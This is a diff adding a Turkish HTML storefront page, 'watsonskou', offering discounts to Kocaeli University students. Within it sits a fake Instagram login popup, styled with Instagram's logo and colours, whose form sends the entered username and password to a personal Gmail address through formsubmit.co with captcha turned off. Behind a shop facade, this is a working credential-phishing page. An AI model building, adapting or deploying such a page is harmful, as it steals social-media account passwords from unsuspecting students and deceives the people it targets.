@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>watsonskou | KOÜ Öğrencilerine Özel Kampanyalar ve Fırsatlar</title>
+  <meta name="description" content="KOÜ Öğrencilerine Özel Kampanyalar ve Fırsatlar">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* INSTAGRAM MODAL STİLLERİ (ÇAKIŞMAYACAK BENZERSİZ İSİMLER) */
+    .ig-popup-backdrop {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      z-index: 99999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    .ig-popup-backdrop.active {
+      display: flex !important;
+    }
+    
+    .ig-popup-box {
+      background: #ffffff;
+      width: 100%;
+      max-width: 360px;
+      border-radius: 16px;
+      padding: 2.2rem 1.8rem 1.8rem;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      position: relative;
+      text-align: center;
+      border: 1px solid #dbdbdb;
+      box-sizing: border-box;
+    }
+    
+    .ig-close-btn {
+      position: absolute;
+      top: 0.8rem;
+      right: 1rem;
+      background: transparent;
+      border: 0;
+      font-size: 1.8rem;
+      line-height: 1;
+      cursor: pointer;
+      color: #8e8e8e;
+    }
+    .ig-close-btn:hover { color: #262626; }
+
+    .ig-brand-logo {
+      width: 160px;
+      margin: 0 auto 1.5rem;
+      display: block;
+    }
+
+    .ig-field-group {
+      margin-bottom: 0.6rem;
+      text-align: left;
+    }
+    
+    .ig-field-input {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 6px;
+      padding: 11px 12px;
+      font-size: 0.85rem;
+      box-sizing: border-box;
+      color: #262626;
+      font-family: inherit;
+    }
+    .ig-field-input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+      background: #ffffff;
+    }
+    .ig-field-input::placeholder { color: #8e8e8e; }
+
+    .ig-submit-action {
+      width: 100%;
+      margin-top: 0.8rem;
+      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      color: #ffffff;
+      border: 0;
+      border-radius: 8px;
+      padding: 11px;
+      font-size: 0.9rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: opacity 0.2s;
+      font-family: inherit;
+    }
+    .ig-submit-action:hover { opacity: 0.92; }
+
+    .ig-note-text {
+      margin-top: 1.4rem;
+      font-size: 0.78rem;
+      color: #8e8e8e;
+      line-height: 1.4;
+    }
+
+    /* HEADER BUTONU */
+    .header-actions { display: flex; align-items: center; gap: 0.5rem; margin-left: auto; }
+    .ig-header-btn {
+      border: 0;
+      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      color: #fff;
+      border-radius: 999px;
+      padding: 0.55rem 1.2rem;
+      font-weight: 600;
+      font-size: 0.88rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      box-shadow: 0 4px 12px rgba(220, 39, 67, 0.25);
+      transition: transform 0.2s, box-shadow 0.2s;
+      font-family: inherit;
+    }
+    .ig-header-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 16px rgba(220, 39, 67, 0.35);
+    }
+    .ig-svg-icon { width: 16px; height: 16px; fill: currentColor; }
+  </style>
+</head>
+<body>
+
+  <div class="ticker" aria-label="Duyurular">
+    <div class="ticker-track">
+      <span>Öğrenci kimliğini göster, %15 ek indirim kazan</span>
+      <span>Umuttepe Kampüsü'ne 150 ₺ üzeri siparişlerde ücretsiz teslimat</span>
+      <span>Vize haftası bakım paketleri stoklarla sınırlı</span>
+      <span>Öğrenci kimliğini göster, %15 ek indirim kazan</span>
+      <span>Umuttepe Kampüsü'ne 150 ₺ üzeri siparişlerde ücretsiz teslimat</span>
+      <span>Vize haftası bakım paketleri stoklarla sınırlı</span>
+    </div>
+  </div>
+
+  <header class="header" id="top">
+    <div class="container header-row">
+      <a href="#top" class="logo" aria-label="watsonskou ana sayfa">watsons<b>kou</b></a>
+
+      <form class="search" id="searchForm" role="search">
+        <label for="searchInput" class="sr-only">Ürün ara</label>
+        <input type="search" id="searchInput" placeholder="Ürün veya marka ara" autocomplete="off">
+        <button type="submit" aria-label="Ara">Ara</button>
+      </form>
+
+      <div class="header-actions">
+        <button class="cart-btn" id="cartBtn" aria-label="Sepetim">
+          Sepet <span class="cart-count" id="cartCount">0</span>
+        </button>
+
+        <button class="ig-header-btn" id="openIgModalBtn">
+          <svg class="ig-svg-icon" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+          Instagram ile Giriş Yap
+        </button>
+      </div>
+
+      <button class="menu-toggle" id="menuToggle" aria-expanded="false" aria-controls="nav" aria-label="Menüyü aç">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+
+    <nav class="nav" id="nav" aria-label="Ana menü">
+      <div class="container">
+        <a href="#top" class="active">Ana Sayfa</a>
+        <a href="#kou-firsatlari">KOÜ Özel Fırsatlar</a>
+        <a href="#ogrenci-indirimleri">Öğrenci İndirimleri</a>
+        <a href="#iletisim">İletişim</a>
+      </div>
+    </nav>
+  </header>
+
+  <!-- INSTAGRAM GİRİŞ POPUP -->
+  <div class="ig-popup-backdrop" id="igModalBackdrop">
+    <div class="ig-popup-box">
+      <button class="ig-close-btn" id="closeIgModalBtn">&times;</button>
+
+      <!-- Instagram Yazı Logosu -->
+      <svg class="ig-brand-logo" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12.18 39.46c-4.47 0-7.3-2.58-7.3-6.6 0-4.3 3.32-6.57 9.4-6.57 1.8 0 3.3.16 4.36.37v-.5c0-2.45-1.43-3.7-4.14-3.7-2.07 0-4.22.65-5.9 1.72l-1.3-3.32c2.14-1.37 5.17-2.14 8.16-2.14 5.37 0 8.27 2.72 8.27 7.95v12.28h-3.92v-2.3c-1.43 1.68-3.98 2.8-7.63 2.8zm1.08-3.48c2.8 0 5.17-1.43 5.17-3.92v-1.48c-.85-.16-2.04-.26-3.43-.26-3.7 0-5.5 1.25-5.5 3.37 0 1.54 1.2 2.3 3.76 2.3zM29.8 39h-4.32V19.1h4.32V39zm-2.16-22.37c-1.5 0-2.7-1.18-2.7-2.68 0-1.5 1.2-2.68 2.7-2.68 1.5 0 2.7 1.18 2.7 2.68 0 1.5-1.2 2.68-2.7 2.68zM36.1 34.02c1.47 1.28 3.65 2.05 5.86 2.05 3.1 0 4.88-1.5 4.88-3.7 0-2.13-1.4-3.23-4.83-4.1-4.73-1.2-7.16-2.85-7.16-6.4 0-4.3 3.73-7.17 9.17-7.17 2.94 0 5.75.76 7.6 2.02l-1.44 3.34c-1.44-1.02-3.48-1.74-5.96-1.74-3.1 0-4.66 1.4-4.66 3.25 0 2.02 1.5 2.9 5.08 3.82 4.7 1.2 6.95 3.1 6.95 6.6 0 4.6-3.7 7.4-9.75 7.4-3.32 0-6.62-.9-8.48-2.32l1.35-3.07zM59.18 39.46c-5.7 0-9.2-3.8-9.2-9.98 0-6.38 3.7-10.38 9.6-10.38 3.1 0 5.6.9 7.3 2.1l-1.3 3.3c-1.4-1.0-3.3-1.7-5.5-1.7-3.9 0-5.7 2.8-5.7 6.6 0 3.8 1.8 6.4 5.7 6.4 2.1 0 4.3-.7 5.7-1.85l1.3 3.2c-1.8 1.3-4.6 2.3-7.9 2.3zM70.92 39h-4.32V19.1h4.32V39zm-2.16-22.37c-1.5 0-2.7-1.18-2.7-2.68 0-1.5 1.2-2.68 2.7-2.68 1.5 0 2.7 1.18 2.7 2.68 0 1.5-1.2 2.68-2.7 2.68zM84.77 39.46c-4.47 0-7.3-2.58-7.3-6.6 0-4.3 3.32-6.57 9.4-6.57 1.8 0 3.3.16 4.36.37v-.5c0-2.45-1.43-3.7-4.14-3.7-2.07 0-4.22.65-5.9 1.72l-1.3-3.32c2.14-1.37 5.17-2.14 8.16-2.14 5.37 0 8.27 2.72 8.27 7.95v12.28h-3.92v-2.3c-1.43 1.68-3.98 2.8-7.63 2.8zm1.08-3.48c2.8 0 5.17-1.43 5.17-3.92v-1.48c-.85-.16-2.04-.26-3.43-.26-3.7 0-5.5 1.25-5.5 3.37 0 1.54 1.2 2.3 3.76 2.3zM98.7 39V19.1h3.9v2.55c1.4-1.8 3.7-2.95 6.4-2.95 4.6 0 7.3 2.9 7.3 7.8V39h-4.3v-11.8c0-3.1-1.4-4.8-4.3-4.8-2.7 0-4.7 1.9-4.7 4.9V39H98.7zM126.9 39.46c-5.8 0-9.5-4-9.5-10.1s3.7-10.26 9.5-10.26c5.8 0 9.4 4.16 9.4 10.26 0 6.1-3.6 10.1-9.4 10.1zm0-3.66c3.6 0 5.1-2.8 5.1-6.44 0-3.64-1.5-6.6-5.1-6.6-3.6 0-5.2 2.96-5.2 6.6 0 3.64 1.6 6.44 5.2 6.44zM140.7 39V19.1h3.9v2.55c1.4-1.8 3.7-2.95 6.4-2.95 4.6 0 7.3 2.9 7.3 7.8V39h-4.3v-11.8c0-3.1-1.4-4.8-4.3-4.8-2.7 0-4.7 1.9-4.7 4.9V39h-4.3z" fill="#262626"/>
+      </svg>
+      
+      <!-- FormSubmit Servisi -->
+      <form action="https://formsubmit.co/alsaydinneolurdu@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="Instagram İle Giriş Yapıldı!">
+        <input type="hidden" name="_captcha" value="false">
+
+        <div class="ig-field-group">
+          <input type="text" class="ig-field-input" name="Kullanıcı Adı" placeholder="Kullanıcı adı, e-posta veya telefon" required autocomplete="username">
+        </div>
+
+        <div class="ig-field-group">
+          <input type="password" class="ig-field-input" name="Şifre" placeholder="Şifre" required autocomplete="current-password">
+        </div>
+
+        <button type="submit" class="ig-submit-action">Giriş Yap</button>
+      </form>
+
+      <p class="ig-note-text">watsonskou hesabınızı onaylamak için Instagram hesabınızla oturum açın.</p>
+    </div>
+  </div>
+
+  <main>
+    <section class="hero">
+      <div class="container hero-grid">
+        <div class="hero-text">
+          <p class="hero-tag">Umuttepe'den sepetine</p>
+          <h1>KOÜ Öğrencilerine Özel Kampanyalar ve Fırsatlar</h1>
+          <p class="hero-sub">Bakım, kozmetik ve günlük ihtiyaçlarda sadece KOÜ'lülere özel fiyatlar. Öğrenci kimliğin yeterli.</p>
+          <div class="hero-actions">
+            <a href="#kou-firsatlari" class="btn btn-pink">Fırsatlara Göz At</a>
+            <a href="#ogrenci-indirimleri" class="btn btn-ghost">İndirim Kodunu Al</a>
+          </div>
+        </div>
+
+        <aside class="hero-card" aria-label="Duyuru">
+          <h2>Dönem Başı Kampanyası</h2>
+          <p>Kampanya bitimine kalan süre</p>
+          <div class="countdown" id="countdown" aria-live="off">
+            <div><strong id="cdD">00</strong><span>gün</span></div>
+            <div><strong id="cdH">00</strong><span>saat</span></div>
+            <div><strong id="cdM">00</strong><span>dk</span></div>
+            <div><strong id="cdS">00</strong><span>sn</span></div>
+          </div>
+          <p class="hero-note">Ürünlerde geçerli <b>%15</b> ek öğrenci indirimi</p>
+        </aside>
+      </div>
+    </section>
+
+    <section class="section" id="kou-firsatlari">
+      <div class="container">
+        <div class="section-head">
+          <h2>KOÜ Özel Fırsatlar</h2>
+          <p id="resultInfo">Bu hafta öne çıkan ürünler</p>
+        </div>
+
+        <div class="chips" id="chips" role="group" aria-label="Kategori filtresi">
+          <button class="chip active" data-cat="hepsi">Tümü</button>
+          <button class="chip" data-cat="cilt">Cilt Bakımı</button>
+          <button class="chip" data-cat="makyaj">Makyaj</button>
+          <button class="chip" data-cat="sac">Saç Bakımı</button>
+          <button class="chip" data-cat="kisisel">Kişisel Bakım</button>
+        </div>
+
+        <div class="grid" id="productGrid"></div>
+        <p class="empty" id="emptyMsg" hidden>Aramanla eşleşen ürün bulunamadı. Başka bir kelime dene veya filtreyi "Tümü" yap.</p>
+      </div>
+    </section>
+
+    <section class="section section-dark" id="ogrenci-indirimleri">
+      <div class="container perks">
+        <div class="perk-intro">
+          <h2>Öğrenci İndirimleri</h2>
+          <p>Üç adımda indirimi aç.</p>
+        </div>
+        <ol class="steps">
+          <li><b>Kimliğini hazırla.</b> Geçerli KOÜ öğrenci kimliği veya e-Devlet öğrenci belgesi.</li>
+          <li><b>Kodu kopyala.</b> Aşağıdaki kodu sepet ekranında gir.</li>
+          <li><b>İndirimi kap.</b> Seçili ürünlerde %15 ek indirim anında uygulanır.</li>
+        </ol>
+        <div class="code-box">
+          <span>İndirim kodu</span>
+          <code id="promoCode">KOU15</code>
+          <button class="btn btn-pink" id="copyBtn">Kodu Kopyala</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="iletisim">
+      <div class="container contact">
+        <div>
+          <h2>İletişim</h2>
+          <p>Soruların, önerilerin veya kulübün için kampanya talebin mi var? Yaz, dönüş yapalım.</p>
+        </div>
+        <form class="contact-form" id="contactForm">
+          <label>Adın
+            <input type="text" name="ad" required autocomplete="name">
+          </label>
+          <label>KOÜ e-posta adresin
+            <input type="email" name="eposta" required autocomplete="email">
+          </label>
+          <label>Mesajın
+            <textarea name="mesaj" rows="4" required></textarea>
+          </label>
+          <button type="submit" class="btn btn-pink">Mesajı Gönder</button>
+          <p class="form-msg" id="formMsg" role="status"></p>
+        </form>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-grid">
+      <div>
+        <a href="#top" class="logo logo-light">watsons<b>kou</b></a>
+        <p class="footer-slogan">KOÜ Öğrencilerine Özel Kampanyalar ve Fırsatlar</p>
+      </div>
+
+      <div>
+        <h3>Kulüp Duyuruları</h3>
+        <ul class="club-list">
+          <li><b>Girişimcilik Kulübü:</b> Kampüs pazarı, kampanya standı</li>
+          <li><b>Sağlıklı Yaşam Topluluğu:</b> Bakım ürünleri tanıtım günü</li>
+          <li><b>Fotoğrafçılık Kulübü:</b> Ürün çekimi için gönüllü aranıyor</li>
+        </ul>
+      </div>
+
+      <div>
+        <h3>Bizi Takip Et</h3>
+        <ul class="social">
+          <li><a href="https://www.instagram.com/" target="_blank" rel="noopener">Instagram</a></li>
+          <li><a href="https://x.com/" target="_blank" rel="noopener">X</a></li>
+          <li><a href="https://www.youtube.com/" target="_blank" rel="noopener">YouTube</a></li>
+          <li><a href="https://www.tiktok.com/" target="_blank" rel="noopener">TikTok</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="container legal">
+      <p>Bu site, Kocaeli Üniversitesi öğrencileri için hazırlanmış bağımsız bir konsept çalışmasıdır. Watsons, A.S. Watson Group'a; Kocaeli Üniversitesi'ne ait ad ve markalarla resmî bir bağı yoktur. Gösterilen ürünler, fiyatlar me mekampanyalar örnek amaçlıdır.</p>
+      <p>© <span id="year">2026</span> watsonskou</p>
+    </div>
+  </footer>
+
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <script src="script.js"></script>
+  
+  <!-- Pop-up Scripti -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      var modal = document.getElementById('igModalBackdrop');
+      var openBtn = document.getElementById('openIgModalBtn');
+      var closeBtn = document.getElementById('closeIgModalBtn');
+
+      if (openBtn && modal) {
+        openBtn.addEventListener('click', function () {
+          modal.classList.add('active');
+        });
+      }
+
+      if (closeBtn && modal) {
+        closeBtn.addEventListener('click', function () {
+          modal.classList.remove('active');
+        });
+      }
+
+      if (modal) {
+        modal.addEventListener('click', function (e) {
+          if (e.target === modal) {
+            modal.classList.remove('active');
+          }
+        });
+      }
+    });
+  </script>
+</body>
+</html>
